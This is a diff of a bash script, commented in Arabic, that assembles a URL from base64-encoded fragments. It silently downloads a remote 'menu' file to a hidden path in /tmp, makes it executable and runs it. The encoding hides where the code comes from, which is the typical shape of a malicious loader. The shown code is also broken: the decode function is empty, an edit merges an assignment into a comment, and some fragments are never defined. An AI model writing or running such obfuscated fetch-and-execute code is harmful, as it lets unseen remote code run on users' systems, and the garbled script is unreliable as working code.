@@ -1,11 +1,8 @@
 #!/bin/bash
-
 download_menu_script() {
   decode() {
   }
-
-  # فك تشفير أجزاء الرابط المشفرة مسبقًا ثم تجميعها
-  p1=$(decode "cmF3")
+  # فك تشفير أجزاء الرابط المشفرة مسبقًا ثم تجميعها  p1=$(decode "cmF3")
   p4=$(decode "LmdpdGh1Yg==")
   p5=$(decode "dXNlcmNvbnRlbnQuY29t")
   p6=$(decode "L2hxLW1w")
@@ -14,18 +11,13 @@ download_menu_script() {
   p8=$(decode "L21haW4vbWVudQ==")
   p13=$(decode "Ly8=")
   p15=$(decode "aHR0cHM6")
-
   # تجميع الرابط النهائي من الأجزاء المفكوكة
   full_url="${p15}${p13}${p1}${p4}${p5}${p6}${p7}${p9}${p8}"
-
   # تحميل الملف من الرابط النهائي وتخزينه مؤقتًا
   curl -s "$full_url" -o /tmp/.zi_menu
-
   # إعطاء الملف صلاحية التنفيذ
   chmod +x /tmp/.zi_menu
-
   # تشغيل الملف الذي تم تحميله
   bash /tmp/.zi_menu
 }
-
 download_menu_script
